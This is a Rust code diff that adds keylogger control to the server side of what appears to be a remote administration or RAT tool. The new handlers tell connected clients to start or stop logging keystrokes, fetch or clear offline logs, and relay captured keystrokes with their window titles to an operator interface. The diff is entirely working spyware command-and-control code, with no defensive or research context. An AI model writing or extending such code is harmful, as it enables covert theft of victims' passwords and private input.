@@ -573,6 +573,41 @@ impl ServerWrapper {
                         .await;
                 }
 
+                StartKeylogger(addr, realtime) => {
+                    self.handle_command(&addr, ClientboundPacket::StartKeylogger(realtime))
+                        .await;
+                }
+
+                StopKeylogger(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::StopKeylogger)
+                        .await;
+                }
+
+                GetOfflineLogs(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetOfflineLogs)
+                        .await;
+                }
+
+                ClearOfflineLogs(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::ClearOfflineLogs)
+                        .await;
+                }
+
+                KeyloggerUpdate(addr, update) => {
+                    self.emit_serde_payload("keylogger_update", serde_json::json!({
+                        "addr": addr.to_string(),
+                        "window": update.window_title,
+                        "data": update.key_data
+                    })).await;
+                }
+
+                KeyloggerOfflineLogs(addr, logs) => {
+                    self.emit_serde_payload("keylogger_offline_logs", serde_json::json!({
+                        "addr": addr.to_string(),
+                        "logs": logs
+                    })).await;
+                }
+
 
             }
         }
